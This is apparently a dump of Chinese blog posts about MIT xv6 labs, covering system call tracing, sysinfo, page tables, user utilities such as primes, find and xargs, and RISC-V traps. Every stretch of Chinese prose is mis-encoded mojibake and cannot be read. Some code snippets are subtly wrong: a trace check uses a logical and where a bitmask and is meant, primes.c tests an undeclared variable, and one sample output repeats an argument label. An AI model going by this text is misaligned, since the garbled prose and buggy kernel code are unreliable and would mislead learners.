kerneltrapï¼Œè€Œåœ¨å¤„ç†ä¹‹å‰ï¼Œå…ˆä¿å­˜å†…æ ¸çš„çŠ¶æ€ï¼Œkernelvec å°±æ˜¯åšè¿™æ ·çš„äº‹æƒ…ï¼›scause æè¿° trap åŸå› ï¼Œsepc ä¿å­˜å‘ç”Ÿ trap æ—¶ pc çš„å€¼ï¼Œstval ä¿å­˜å‘ç”Ÿ trap çš„å€¼ System call tracingåœ¨ user/trace.c å·²ç»å†™å¥½äº†ç¨‹åºï¼Œåªéœ€è¦å®ç°ç³»ç»Ÿè°ƒç”¨å³å¯ å…ˆåœ¨ user/user.h åŠ ä¸ŠåŸå‹ï¼Œåœ¨ user/usys.pl åŠ ä¸Š stubï¼ˆå­˜æ ¹ï¼‰ï¼Œåœ¨ kernel/syscall.h åŠ ä¸Šç³»ç»Ÿè°ƒç”¨å· åœ¨ kernel.c çš„ proc ç»“æ„ä½“åŠ ä¸Šä¸€ä¸ªæ–°å˜é‡ trace_mask åœ¨ kernel/sysproc.c åŠ ä¸Š sys_traceï¼Œè®¾ç½®å½“å‰è¿›ç¨‹çš„ track_mask kernel/sysproc.c1234567891011uint64sys_trace(int){ int mask; argint(0, &amp;mask); if(mask &lt; 0) mask = 0; myproc()-&gt;trace_mask = mask; return 0;} ä¿®æ”¹ kernel/proc.c çš„ fork å‡½æ•°ï¼Œå°†çˆ¶è¿›ç¨‹çš„ tracemask ä¼ ç»™å­è¿›ç¨‹ kernel/proc.c1np-&gt;trace_mask = p-&gt;trace_mask; ä¿®æ”¹ kernel/syscall.c çš„ syscall å‡½æ•°ï¼Œå¦‚æœæ˜¯ trace_mask å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå°±æ‰“å°å‡ºæ¥ï¼ˆé‡Œé¢è¿˜è¦æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ syscallNamesï¼‰ kernel/syscall.c12345ret = syscalls[num]();p-&gt;trapframe-&gt;a0 = ret;if(p-&gt;tracemask &amp;&amp; 1&lt;&lt;num) printf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscall_names[num], ret); ä¸€ä¸ªå¾ˆç®€å•çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…ä»…æ˜¯è·å–ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼Œç„¶åå°†å‚æ•°ä¼ ç»™ p-&gt;trace_maskï¼Œåœ¨ syscall å‡½æ•°ä¸­æ£€æŸ¥è¾“å‡ºè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå°±å¯ä»¥å®ç°ï¼Œä½†æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šç»†èŠ‚ Sysinfoè¿™é‡Œæˆ‘ä»¬è¦ä½¿ç”¨ copyoutï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å‡½æ•°ä½å¤„äºå†…æ ¸æ¨¡å¼ï¼Œéœ€è¦è¿›ç¨‹çš„é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€æ¥æŸ¥æ‰¾ç”¨æˆ·è¿›ç¨‹ä¸­å˜é‡çš„ç‰©ç†ä½ç½®ï¼ˆæ¯”å¦‚ sysinfo ç»“æ„ä½“ï¼‰ï¼Œç„¶åå°†å†…æ ¸çš„æ•°æ®å¤åˆ¶ç»™ç”¨æˆ·è¿›ç¨‹ kernel/sysproc.c1234567891011121314151617uint64sys_sysinfo(void){ uint64 si; struct sysinfo info; argaddr(0, &amp;si); if(!si) { return -1; } info.freemem = get_freemem(); info.nproc = get_nproc(); if(copyout(myproc()-&gt;pagetable, si, (char*)&amp;info, sizeof(info)) &lt; 0) { return -1; } return 0;} å†™ get_freemem æ—¶ï¼Œè§‚å¯Ÿ kalloc å‡½æ•°ï¼Œç›´æ¥ä» kmem.freelist å–ä¸€é¡µå†…å­˜è¿”å›ï¼Œå¯ä»¥æ¨æµ‹ kmem.freelist åŒ…å«æ‰€æœ‰å¯ç”¨çš„å†…å­˜ kernel/kalloc.c1234567891011uint64get_freemem(void){ struct run *r; uint64 n = 0; for(r = kmem.freelist; r; r = r-&gt;next) { n += 4096; } return n;} å†™ ger_nproc æ—¶ï¼Œè§‚å¯Ÿ procinit å‡½æ•°ï¼Œåœ¨ proc[NPROC] æ•°æ®ä¸­éå†åˆå§‹åŒ–ï¼Œä¸”å…¶ä¸­å« state å˜é‡ kernel/proc.c123456789101112uint64get_nproc(void){ struct proc *p; uint64 nproc = 0; for(p = proc; p &lt; &amp;proc[NPROC]; p++) { if(p-&gt;state != UNUSED) { nproc++; } } return nproc;} è®°å¾—åœ¨ sysproc.c å¼•å…¥ sysinfo.hï¼Œåœ¨ defs.h åŠ ä¸Š get_freemem å’Œ get_nproc Optional challenge exercisesæ‰“å°å‡ºè¢«è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°ä¸ªæ•°è®°å½•åœ¨æ•°ç»„é‡Œï¼Œç„¶åæ‰“å°å‡ºæ¥å°±å¥½äº† kernel/syscall.c12345if(p-&gt;trace_mask &amp; 1&lt;&lt;num) { printf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscall_names[num], ret); for(int i = 0; i &lt; syscall_args[num]; i++) printf(&quot;arg%d: %p\\n&quot;, i+1, argraw(i));} æ‰“å°å‡ºæ¥æ˜¯è¿™æ ·çš„ 1234567891011121314151617$ trace 32 grep hello README3: syscall read -&gt; 1023arg1: 0x00000000000003ffarg2: 0x0000000000001010arg3: 0x00000000000003ff3: syscall read -&gt; 961arg1: 0x00000000000003c1arg2: 0x000000000000104earg3: 0x00000000000003c13: syscall read -&gt; 321arg1: 0x0000000000000141arg3: 0x0000000000001037arg3: 0x00000000000003d83: syscall read -&gt; 0arg1: 0x0000000000000000arg2: 0x0000000000001010arg3: 0x00000000000003ff è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡ sysinfo å¯¼å‡ºå¯ä»¥å€Ÿç”¨ Linux çš„ç®—æ³•è®¡ç®—ï¼ˆæ‡’ï¼‰","link":"/2022/10/20/Lab2_System_calls/"},{"title":"Lab3 Page Tables","text":"å¼€å­¦ï¼ git123git fetchgit checkout pgtblmake clean Speed up system callsä¸ºäº†ä¼˜åŒ– getpid ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ç”¨æ¯æ¬¡è¿›å…¥å†…æ ¸æ€è·å– PIDï¼Œåˆ›å»ºä¸€ä¸ªç”¨æˆ·å¯è¯»çš„é¡µï¼Œå°† USYSCALL æ˜ å°„åˆ°è¯¥é¡µä¸Š å¯ä»¥è§‚å¯Ÿ ugetpid å‡½æ•°çš„å®šä¹‰ï¼Œå®ƒç›´æ¥è®¿é—® USYSCALL å³å¯æ‹¿åˆ° pidï¼Œä¸éœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼Œç®—æ˜¯ä»¥ç©ºé—´æ¢æ—¶é—´ user/ulib.c123456intugetpid(void){ struct usyscall *u = (struct usyscall *)USYSCALL; return u-&gt;pid;} åœ¨ kernel/proc.h ä¸­ proc ç»“æ„ä½“åŠ å…¥ struct usyscall *usyscall åœ¨ allocproc åˆå§‹åŒ– usyscall kernel/proc.c12345678910111213static struct proc* allocproc(void){ ... if((p-&gt;usyscall = (struct usyscall *)kalloc()) == 0){ freeproc(p); release(&amp;p-&gt;lock); return 0; } p-&gt;usyscall-&gt;pid = p-&gt;pid; ...} åœ¨ proc_pagetable å»ºç«‹æ˜ å°„ kernel/proc.c1234567891011121314pagetable_t proc_pagetable(struct proc *p){ ... if(mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; 0){ uvmunmap(pagetable, TRAPFRAME, 1, 0); uvmunmap(pagetable, TRAMPOLINE, 1, 0); uvmfree(pagetable, 0); return 0; } ...} åœ¨ freeproc é‡Šæ”¾ usyscall kernel/proc.c12345678910static void freeproc(struct proc *p){ ... if(p-&gt;usyscall) kfree((void*)p-&gt;usyscall); p-&gt;usyscall = 0; ...} åœ¨ proc_freepagetable å–æ¶ˆé¡µé¢æ˜ å°„ï¼ˆè¿™é‡Œå®éªŒæ–‡æ¡£æ²¡è¯´ï¼Œè¦è‡ªå·±å‘ç°åœ¨ freeproc å‡½æ•°ä¸­è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼‰ kernel/proc.c12345678voidproc_freepagetable(pagetable_t pagetable, uint64 sz){ uvmunmap(pagetable, TRAMPOLINE, 1, 0); uvmunmap(pagetable, TRAPFRAME, 1, 0); uvmunmap(pagetable, USYSCALL, 1, 0); uvmfree(pagetable, sz);} æé—®ï¼šè¿˜æœ‰ä»€ä¹ˆå…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨å¯ä»¥é€šè¿‡è¿™æ ·çš„å…±äº«é¡µæ¥åŠ å¿«é€Ÿåº¦ï¼Ÿ æ€ä¹ˆæ„Ÿè§‰æ²¡æœ‰äº† Print a page tablexv6 ä½¿ç”¨ä¸‰çº§é¡µè¡¨ï¼Œåœ¨è¿è¡Œç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹æ—¶æ‰“å°å‡ºå…¶é¡µè¡¨ è¿™é‡Œä½¿ç”¨ä¸€ä¸ªé™æ€å˜é‡ level è¡¨ç¤ºåœ¨ç¬¬å‡ çº§é¡µè¡¨ kernel/vm.c12345678910111213141516171819202122voidpteprint(pagetable_t pagetable, int level){ for(int i = 0; i &lt; 512; i++) { pte_t pte = pagetable[i]; if(pte &amp; PTE_V) { uint64 child = PTE2PA(pte); for(int j = 0; j &lt; level; j++) printf(&quot; ..&quot;); printf(&quot;%d: pte %p pa %p\\n&quot;, i, pte, child); if((pte &amp; (PTE_R | PTE_W | PTE_X)) == 0) pteprint((pagetable_t)child, level+1); } }}voidvmprint(pagetable_t pagetable){ printf(&quot;page table %p\\n&quot;, pagetable); pteprint(pagetable, 1);} ç¬”è€…ä¹‹å‰ä½¿ç”¨å±€éƒ¨é™æ€å˜é‡æ¥åˆ¤æ–­ levelï¼Œä½†æ˜¯æƒ³ç€å¦‚æœæ˜¯å¤šçº¿ç¨‹çš„è¯æ²¡æœ‰åŠ é”å¯èƒ½ä¼šå‡ºé—®é¢˜ ç„¶ååœ¨ defs.h å’Œ exec.c ä¸­æ·»åŠ å£°æ˜å’Œä½¿ç”¨å°±è¡Œ Detect which pages have been accessedRISC-V ç¡¬ä»¶ä¼šåœ¨ TLB å‘½ä¸­å¤±è´¥æ—¶ï¼Œå°†å¯¹åº” PTE çš„ Access æ ‡å¿—ä½è®¾ 1ï¼Œç”¨æ¥è®°å½•è¯¥é¡µé¢æœ‰æ²¡æœ‰è®¿é—®è¿‡ å†™ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸‰ä¸ªå‚æ•°ï¼Œæ£€æµ‹çš„åœ°å€ï¼Œæ£€æµ‹çš„é¡µæ•°ï¼Œbitmask æŒºç®€å•çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå®éªŒéš¾åº¦å†™ç€ hard kernel/sysproc.c1234567891011121314151617181920212223242526272829303132333435#define PTE_A (1L &lt;&lt; 6)intsys_pgaccess(void){ uint64 base; uint64 mask; int len; unsigned int abits; argaddr(0, &amp;base); argint(1, &amp;len); if(len &gt; 32) return -1; argaddr(2, &amp;mask); abits = 0; pagetable_t pagetable = myproc()-&gt;pagetable; for(int i = 0; i &lt; len; i++) { pte_t *pte = walk(pagetable, base + PGSIZE * i, 0); if(pte == 0) return -1; if(*pte &amp; PTE_A) { abits |= 1 &lt;&lt; i; *pte &amp;= ~PTE_A; } } if(copyout(pagetable, mask, (char*)&amp;abits, sizeof(abits)) &lt; 0) return -1; return 0;``} æ³¨æ„æ£€æµ‹å®Œåï¼Œå°†æ ‡è®°ç½®é›¶ï¼Œä¸ç„¶ä¸çŸ¥é“æ£€æµ‹åè¿˜æ²¡æœ‰è®¿é—®è¿‡ Optional challenge exercisesä½¿ç”¨ super-pages å‡å°‘é¡µè¡¨ä¸­ PTE çš„æ•°é‡ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ”¹ç”¨æ›´å¤§çš„é¡µï¼ˆï¼Ÿï¼‰ å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ å°„ï¼Œè¿™æ ·å¯ä»¥ä½¿å¼•ç”¨ç©ºæŒ‡é’ˆç›´æ¥é€ æˆé”™è¯¯ éœ€è¦ä¿®æ”¹ user.ld æ–‡ä»¶ï¼Œè®©è¿›ç¨‹çš„ text æ®µä» 0x1000 å¼€å§‹ï¼Œè€Œä¸æ˜¯ 0 ä¼°è®¡è¦æ”¹å¾ˆå¤šä¸œè¥¿ï¼ˆuvmmapï¼Œuvmallocå•¥çš„ï¼‰ã€‚ã€‚ã€‚å’•å’•å’• æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š dirty pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰å’Œç¬¬ä¸‰ä¸ªå·®ä¸å¤šï¼Œå°±ä¸åšäº†","link":"/2022/10/23/Lab3_Page_tables/"},{"title":"Lab1 Xv6 and Unix utilities","text":"å¼€å­¦ï¼ å¯åŠ¨ xv6git1234567891011121314151617git clone git://g.csail.mit.edu/xv6-labs-2022# æŸ¥çœ‹ git æ—¥å¿—git statusgit log# ç”¨äºè·å–å®éªŒæ‰€éœ€æ–‡ä»¶git checkout util# å½“å®Œæˆä¸€ä¸ªå®éªŒå¹¶æƒ³è¦æ£€è®°å½•è¿›åº¦å¯ä½¿ç”¨ git commitgit commit -am 'my solution for util lab exercise 1# æŸ¥çœ‹ç›¸æ¯”ä¸Šä¸€æ¬¡ commit çš„å˜åŒ–git diff# æŸ¥çœ‹ç›¸æ¯”æœ€åˆçš„å˜åŒ–git diff origin/util å»ºç«‹å¹¶è¿è¡Œ xv6 make qemu ç¬¬ä¸€æ­¥å°±å‡ºé”™äº†ã€‚ã€‚ã€‚ Error: Couldn't find a riscv64 version of GCC/binutils. ç¼ºå°‘ RISC-V ç›¸å…³çš„ GCC/binutils æœç´¢ binutils apt search binutils | grep riscv64 å®‰è£…ç¬¬ä¸€ä¸ªå³å¯ sudo apt install binutils-riscv64-linux-gnu æ¥ç€æ˜¯å¦ä¸€ä¸ªæŠ¥é”™ riscv64-linux-gnu-gcc -c -o kernel/entry.o kernel/entry.S make: riscv64-linux-gnu-gcc: No such file or directory make: *** [\\&lt;builtin\\&gt;: kernel/entry.o] Error 127 å®‰è£…å¯¹åº”çš„ gcc sudo apt install gcc-10-riscv64-linux-gnu è¿›å…¥ /usr/bin ç›®å½•ï¼Œå»ºç«‹è½¯é“¾æ¥ sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc åé¢åˆæ˜¯ç¼ºå°‘ä»€ä¹ˆæ–‡ä»¶ï¼Œå»ç¿»äº†ç¿» lab ä»‹ç»ï¼Œå‘ç°å·²ç»ç»™äº†å·¥å…·é“¾æ¥ lab tools page sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu è¿™é‡Œçš„ gcc-riscv64-linux-gnu ä¸‹è½½çš„æ˜¯ gcc-11ï¼Œè¦å†ä¸‹å› gcc-10ï¼Œä¸ç„¶ä¼šæŠ¥é”™ sudo apt install gcc-10-riscv64-linux-gnu cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc ç»“æœä¸€æ°”å‘µæˆ~ é‡Œé¢æœ‰ä¸€äº›å¾ˆåŸºæœ¬çš„å‘½ä»¤ 12345678910111213141516171819202122232425262728xv6 kernel is bootinghart 1 startinghart 2 startinginit: starting sh$ ls. 1 1 1024.. 1 1 1024README 2 2 2227xargstest.sh 2 3 93cat 2 4 32832echo 2 5 31728forktest 2 6 15680grep 2 7 36176init 2 8 32152kill 2 9 31712ln 2 10 31520ls 2 11 34728mkdir 2 12 31784rm 2 13 31768sh 2 14 53960stressfs 2 15 32496usertests 2 16 181776grind 2 17 47696wc 2 18 33832zombie 2 19 31168console 3 20 0 -ç”šè‡³éƒ½æ²¡æœ‰ clear Ctrl-p æ‰“å°è¿›ç¨‹ä¿¡æ¯ Ctrl-a x é€€å‡º qemu ç»“è®ºï¼šåšä»»ä½•äº‹ä¹‹å‰å…ˆçœ‹ä»‹ç» æˆç»©æµ‹è¯•1234567# æµ‹è¯•æ‰€æœ‰å®éªŒmake grade# æµ‹è¯•ä¸€ä¸ªç¨‹åº./grade-lab-util name# æˆ–make GRADEFLAGS=name grade sleepåœ¨ bash ä¸­æµ‹è¯•ï¼Œèƒ½å¤Ÿå¤šå‚æ•°ä¸”å¦‚æœä¸€ä¸ªå‚æ•°é”™è¯¯å°±ä¸æ‰§è¡Œ user/sleep.c123456789101112131415161718192021222324252627282930313233#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int isDigitStr(char *str) { for(int i = 0; i &lt; strlen(str); i++) { if(str[i] &lt; '0' || str[i] &gt; '9') { return 0; } } return 1;}int main(int argc, char *argv[]) { int status = 0; if(argc == 1) { printf(&quot;sleep: missing operand\\n&quot;); status = -1; } for(int i = 1; i &lt; argc &amp;&amp; !status; i++) { if(!isDigitStr(argv[i])) { printf(&quot;sleep: invalid time interval\\n&quot;); status = -1; } } for(int i = 1; i &lt; argc &amp;&amp; !status; i++) { sleep(atoi(argv[i])); } exit(status);} æºä»£ç æ”¾åœ¨ user ç›®å½•ä¸‹ï¼Œæ¯æ¬¡å†™å®Œä¸€ä¸ªç¨‹åºåœ¨ Makefile ä¸­çš„ UPROGS ä¸‹æ·»åŠ ä¸€è¡Œ $U/_sleep\\ ç„¶å make qemu ç¼–è¯‘è¿è¡Œ ä¹‹åå¯ä»¥åœ¨ qemu å¤–è¿è¡Œ /grade-lab-util sleep è¿›è¡Œå•é¡¹æµ‹è¯• 12345$ ./grade-lab-util sleepmake: 'kernel/kernel' is up to date.== Test sleep, no arguments == sleep, no arguments: OK (1.5s)== Test sleep, returns == sleep, returns: OK (0.6s)== Test sleep, makes syscall == sleep, makes syscall: OK (1.0s) pingpongç®€å•é¢˜ çˆ¶è¿›ç¨‹å‘é€å­è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚ï¼Œå­è¿›ç¨‹æ”¶åˆ°åå†ç»™çˆ¶è¿›ç¨‹ä¸€ä¸ªå­—èŠ‚ user/pingpong.c1234567891011121314151617181920212223242526#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int pid, p[2]; pipe(p); pid = fork(); if(pid == 0) { if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received ping\\n&quot;, pid); write(p[1], &quot;L&quot;, 1); exit(0); } } else { write(p[1], &quot;H&quot;, 1); if(read(p[0], 0, 1)) { pid = getpid(); printf(&quot;%d: received pong\\n&quot;, pid); } exit(0); } exit(-1);} primesæœ‰ç‚¹éš¾åº¦ï¼Œæƒ³äº†å¥½ä¹…ï¼Œæ„Ÿè§‰æ˜¯è¦ç”¨é€’å½’ï¼Œä½†æ˜¯æ²¡æƒ³å‡ºæ¥æ€ä¹ˆå†™ æƒ³åˆ°åœ¨çœ‹ç½‘è¯¾çš„æ—¶å€™ï¼Œè¿›å…¥å­è¿›ç¨‹å…ˆæŠŠ close(0)ï¼Œç„¶å dup(p[1])ï¼Œä¹Ÿå°±æ˜¯æŠŠå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥æ”¹ä¸ºç®¡é“çš„è¾“å…¥äº†ï¼Œè¿™æ ·å°±å®¹æ˜“å†™é€’å½’äº† æ¯æ¬¡åªè¾“å‡ºæ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªæ•°ï¼Œå®ƒå¿…ç„¶æ˜¯ç´ æ•° å½“ä»è¾“å…¥æ¥æ”¶ä¸åˆ° prime çš„æ—¶å€™ exit(0) è¿™é‡Œæ³¨æ„ dup(p[1]) åè¦æŠŠç®¡é“éƒ½ç»™å…³äº† user/primes.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &quot;kernel/types.h&quot;#include &quot;user/user.h&quot;void printPrime(int prime);void primes(int start);int main(int argc, char *argv[]) { primes(1); exit(-1);}void printPrime(int prime) { printf(&quot;prime %d\\n&quot;, prime);}void primes(int start) { int prime = 2; int n, pid, p[2]; if(!start &amp;&amp; read(0, &amp;prime, sizeof(prime)) == 0) { exit(0); } printPrime(prime); pipe(p); pid = fork(); if(pid == 0) { // p[0] =&gt; stdin close(0); dup(p[0]); close(p[0]); // do not need p[1] close(p[1]); primes(0); exit(0); } else { if(start == 1) { for(int i = 3; i &lt;= 35; i++) { if(i % prime != 0) { write(p[1], &amp;i, sizeof(i)); } } } else { while(read(0, &amp;n, sizeof(n))) { if(i % prime != 0) { write(p[1], &amp;n, sizeof(n)); } } } close(p[1]); // wait for child process int status; wait(&amp;status); exit(status); }} findåŒæ ·ä¹Ÿæ˜¯é€’å½’ï¼Œä»ç›®å½•é‡ŒæŸ¥æ‰¾æ–‡ä»¶å¯ä»¥å‚è€ƒ ./user/ls.c å½“æ‰¾çš„æ˜¯æ–‡ä»¶æˆ–è€…æ—¶æ¯”è¾ƒåå­— å½“æ‰¾çš„æ˜¯ç›®å½•æ—¶ï¼Œä» fd è¯»å– struct dirent[]ï¼Œè¡¨ç¤ºç›®å½•ä¸‹çš„æ¯ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ nameï¼Œè¡¨ç¤ºæ–‡ä»¶åï¼Œæ³¨æ„è¿‡æ»¤ . å’Œ .. user/find.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &quot;kernel/types.h&quot;#include &quot;kernel/fcntl.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;kernel/fs.h&quot;#include &quot;user/user.h&quot;int find(char *path, char *filename);int main(int argc, char *argv[]) { if(argc != 3) { printf(&quot;find: invalid arguments\\n&quot;); } int status = find(argv[1], argv[2]); exit(status);}int find(char *path, char *filename) { char buf[512]; char *name, *p; int fd; struct stat st; struct dirent de; if((fd = open(path, O_RDONLY)) &lt; 0) { printf(&quot;find: cannot open %s\\n&quot;, path); return -1; } if(fstat(fd, &amp;st) &lt; 0) { printf(&quot;find: cannot stat %s\\n&quot;, path); close(fd); return -1; } switch (st.type) { case T_DEVICE: case T_FILE: name = path; // get position of filename for(int i = strlen(path) - 1; i &gt;= 0; i--) { if(path[i] == '/') { name = &amp;path[i+1]; break; } } if(!strcmp(name, filename)) { printf(&quot;%s\\n&quot;, path); } break; // if path is directory case T_DIR: if(strlen(path)+1+DIRSIZ+1 &gt; sizeof(buf)) { printf(&quot;find: path too long\\n&quot;); close(fd); return -1; } strcpy(buf, path); p = buf + strlen(buf); *p++ = '/'; while(read(fd, &amp;de, sizeof(de)) == sizeof(de)) { // excpet for &quot;.&quot; and &quot;..&quot; if(de.inum == 0 || !strcmp(de.name, &quot;.&quot;) || !strcmp(de.name, &quot;..&quot;)) { continue; } memmove(p, de.name, DIRSIZ); p[DIRSIZ] = '\\0'; find(buf, filename); } break; } close(fd); return 0;} xargsä¸€å¼€å§‹æ²¡æ‡‚ sh æ€ä¹ˆå®ç°ç®¡é“ æµ‹è¯•å‘ç°å°±æ˜¯å°†ç®¡é“çš„è¯»ç«¯ä½œä¸º | å³è¾¹ç¨‹åºçš„æ ‡å‡†è¾“å…¥ ä¸»è¦æ˜¯åˆ¤æ–­ä»€ä¹ˆæ—¶å€™è·³å‡ºå¾ªç¯ user/xargs.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;kernel/types.h&quot;#include &quot;kernel/param.h&quot;#include &quot;user/user.h&quot;int main(int argc, char *argv[]) { int status, pid, new_argc; int idx = 0; char buf; char *new_argv[MAXARG]; for(int i = 1; i &lt; argc; i++) { new_argv[i-1] = argv[i]; } while(read(0, &amp;buf, 1)) { new_argc = argc; idx = 0; new_argv[new_argc-1] = (char*)malloc(MAXARG); do { // only read one line each time if(buf == '\\n') { new_argv[new_argc-1][idx] = '\\0'; new_argv[new_argc] = 0; break; } else if(buf == ' ') { // if meet ' ', divide into more argv // except for two ' ' if(idx == 0) { continue; } new_argv[new_argc-1][idx] = '\\0'; new_argc++; idx = 0; new_argv[new_argc-1] = (char*)malloc(MAXARG); continue; } new_argv[new_argc-1][idx++] = buf; } while(read(0, &amp;buf, 1)); pid = fork(); if(pid == 0) { exec(new_argv[0], new_argv); printf(&quot;wrong command\\n&quot;); exit(-1); } else { wait(&amp;status); } for(int i = argc; i &lt;= new_argc; i++) { free(new_argv[i-1]); } } exit(status);} Optional challenge exerciseså†™ä¸€ä¸ª uptime ç¨‹åºæ¥è°ƒç”¨ uptime ç³»ç»Ÿè°ƒç”¨ç›´æ¥è°ƒç”¨ uptime ç„¶åæ‰“å°è¿”å›å€¼å°±å¥½äº† å¯¹ grep å®ç°æ­£åˆ™åŒ¹é…yysyï¼Œå¯¹æ­£åˆ™è¡¨è¾¾å¼ä¸æ˜¯å¾ˆäº†è§£ æ”¹é€  sh#todo","link":"/2022/10/13/Lab1_Xv6_and_Unix_utilities/"},{"title":"Lab4 Traps","text":"å¼€å­¦ï¼ RISC-V assemblyuser/call.c123456789101112int g(int x) { return x+3;}int f(int x) { return g(x);}void main(void) { printf(&quot;%d %d\\n&quot;, f(8)+1, 13); exit(0);} é˜…è¯» user/call.asm å›ç­”é—®é¢˜~ main.asm12345678910111213141516171819000000000000001c &lt;main&gt;:void main(void) { 1c: 1141 addi sp,sp,-16 1e: e406 sd ra,8(sp) 20: e022 sd s0,0(sp) 22: 0800 addi s0,sp,16 printf(&quot;%d %d\\n&quot;, f(8)+1, 13); 24: 4635 li a2,13 26: 45b1 li a1,12 28: 00000517 auipc a0,0x0 2c: 7c850513 addi a0,a0,1992 # 7f0 &lt;malloc+0xee&gt; 30: 00000097 auipc ra,0x0 34: 614080e7 jalr 1556(ra) # 644 &lt;printf&gt; exit(0); 38: 4501 li a0,0 3a: 00000097 auipc ra,0x0 3e: 290080e7 jalr 656(ra) # 2ca &lt;exit&gt;} ä¼ ç»™å‡½æ•°çš„å‚æ•°ä¿å­˜åœ¨å“ªäº›å¯„å­˜å™¨ä¸­ï¼Ÿä¾‹å¦‚ main å‡½æ•°ä¸­çš„è°ƒç”¨ printf çš„å‚æ•° 13 ä¿å­˜åœ¨å“ªä¸ªå¯„å­˜å™¨ä¸­ï¼Ÿ a0 ~ a7 ä¿å­˜å‡½æ•°å‚æ•°ï¼Œæ›´å¤šçš„å‚æ•°æ”¾åœ¨æ ˆä¸­ main è°ƒç”¨ printf çš„å‚æ•° 13 åœ¨ a2 ä¸­ main å‡½æ•°ä¸­è°ƒç”¨ f å‡½æ•°çš„æ±‡ç¼–ä»£ç åœ¨å“ªï¼Ÿè°ƒç”¨ g å‡½æ•°çš„ä»£ç åœ¨å“ªï¼Ÿï¼ˆæç¤ºï¼šç¼–è¯‘å™¨å¯èƒ½å†…è”å‡½æ•°ï¼‰ çœŸçš„æœ‰è°ƒç”¨å—ã€‚ã€‚ã€‚æ„Ÿè§‰ç¼–è¯‘å™¨ä¼˜åŒ–äº†ï¼Œç›´æ¥æŠŠ f(8)+1 çš„ç»“æœè®¡ç®—å‡ºæ¥ä¸º 12ï¼Œä¼ ç»™ a1 å¯„å­˜å™¨äº†ã€‚ printf å‡½æ•°çš„åœ°å€æ˜¯å¤šå°‘ï¼Ÿ çœ‹æ³¨é‡Šï¼Œåœ¨ 0x644 åœ¨ main å‡½æ•°ä¸­ï¼Œåœ¨æ‰§è¡Œ jalr è·³è½¬åˆ° printf åï¼Œra å¯„å­˜å™¨çš„å€¼æ—¶å¤šå°‘ï¼Ÿ 0x38 jalr ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å­˜åˆ°æ‹¬å·ä¸­çš„å¯„å­˜å™¨ä¸­ è¿è¡Œä¸‹é¢çš„ä»£ç ï¼Œè¾“å‡ºä»€ä¹ˆï¼Ÿunsigned int i = 0x00646c72;printf(â€œH%xâ€ Wo%sâ€, 57616, &amp;i); He110 World ä¸‹é¢çš„ä»£ç ï¼Œä¼šæ‰“å°å‡º â€˜y=â€™ ä»€ä¹ˆï¼Ÿprintf(â€œx=%d y=%dâ€, 3); æŒ‰ç…§ RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œä¼šæ‰“å°å‡º a2 å¯„å­˜å™¨çš„å€¼ Backtraceå¯¹å†…æ ¸çš„å‡½æ•°è°ƒç”¨è¿›è¡Œå›æº¯ï¼Œæ¯”è¾ƒç®€å• æ ¹æ® RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œra ä½äº fp - 0x8 çš„ä½ç½®ï¼ŒPrev.fp ä½äº fp - 0x10 çš„ä½ç½® åœ¨å†…æ ¸æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆä½äºé¡µé¢çš„é¦–åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥åˆ¤æ–­ä½•æ—¶é€€å‡ºå¾ªç¯ å¯ä»¥é€šè¿‡ gdb è¿›è¡Œè°ƒè¯•ï¼Œ0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000 1234567891011(gdb) x/20gx $fp-0x100x3fffff9f70: 0x0000003fffff9fc0 0x00000000800021aa0x3fffff9f80: 0x0000003fffff9fc0 